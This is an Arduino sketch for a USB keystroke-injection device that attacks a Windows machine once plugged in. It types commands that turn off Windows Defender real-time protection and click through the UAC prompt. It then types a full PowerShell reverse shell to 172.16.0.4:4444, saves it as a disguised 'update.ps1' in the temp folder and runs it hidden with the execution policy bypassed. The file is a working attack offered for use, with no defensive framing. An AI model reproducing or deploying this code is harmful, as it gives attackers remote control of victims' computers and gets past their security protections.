#include <Arduino.h>
#include "USB.h"
#include "USBHIDKeyboard.h"

USBHIDKeyboard Keyboard;

void setup() {
  Keyboard.begin(KeyboardLayout_fr_FR);  

  USB.begin();
 

    delay(2000);

 // --- PHASE 1: Disable Real-Time Protection & Handle UAC ---

    // 1. Open Run Dialog
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    delay(300);
    Keyboard.releaseAll();
    delay(1000);

    // 2. Type path to Threat Settings
    Keyboard.print("windowsdefender://threatsettings/");
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    
    // Wait for browser/page to load
    delay(5000); 

    // 3. Press Space to disable Real-time protection
    Keyboard.press(KEY_SPACE);
    delay(300);
    Keyboard.releaseAll();
    
    // Wait for UAC Prompt to appear
    delay(1000);

    // 4. Navigate UAC Prompt exactly as instructed
    
    // Step A: Press both Alt and Tab
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.press(KEY_TAB);
    delay(100);
    Keyboard.release(KEY_TAB); // Release Tab but keep holding Alt
    
    // Step B: With Alt held, press Left Arrow 2 times
    delay(100);
    Keyboard.press(KEY_LEFT_ARROW);
    delay(100);
    Keyboard.release(KEY_LEFT_ARROW);
    
    delay(100);
    Keyboard.press(KEY_LEFT_ARROW);
    delay(100);
    Keyboard.release(KEY_LEFT_ARROW);
    
    // Step C: Release Alt now
    Keyboard.release(KEY_LEFT_ALT);
    delay(100);

    // Step D: Press Left Arrow 1 time
    Keyboard.press(KEY_LEFT_ARROW);
    delay(100);
    Keyboard.release(KEY_LEFT_ARROW);
    delay(100);

    // Step E: Enter
    Keyboard.press(KEY_RETURN);
    delay(300);
    Keyboard.release(KEY_RETURN);
    
    // Wait for setting to apply
    delay(2000);

    // 5. Close the Windows Defender Settings window
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.press(KEY_F4);
    delay(100);
    Keyboard.releaseAll();
    
    // Brief pause before starting payload
    delay(1000);


    // --- PHASE 2: Execute Payload ---

    

    // 1. Open Windows Run dialog: Win + R
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    delay(300);
    Keyboard.releaseAll();
    delay(600);

    // 2. Open PowerShell via Run
    Keyboard.print("powershell");
    delay(300);
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    
    // Wait for the terminal window to open and focus
    delay(2000); 

    // 3. Type Line 1: Define the $script variable
    Keyboard.print("$script = '$c=New-Object System.Net.Sockets.TCPClient(''172.16.0.4'',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String);$sb2=$sb+''PS ''+(pwd).Path+''> '';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()'");
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(500);

    // 4. Type Line 2: Write to temporary file
    Keyboard.print("Set-Content -Path \"$env:TEMP\\update.ps1\" -Value $script");
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(500);

    // 5. Type Line 3: Launch detached hidden background process using .NET ProcessStartInfo so it survives Alt+F4
    Keyboard.print("$psi = New-Object System.Diagnostics.ProcessStartInfo; $psi.FileName = \"powershell.exe\"; $psi.Arguments = \"-ExecutionPolicy Bypass -File `\"$env:TEMP\\update.ps1`\"\"; $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden; [System.Diagnostics.Process]::Start($psi)");
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(800);

    // 6. Send Alt + F4 to close the active PowerShell window cleanly
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.press(KEY_F4);
    delay(100);
    Keyboard.releaseAll();
}

void loop() {
}



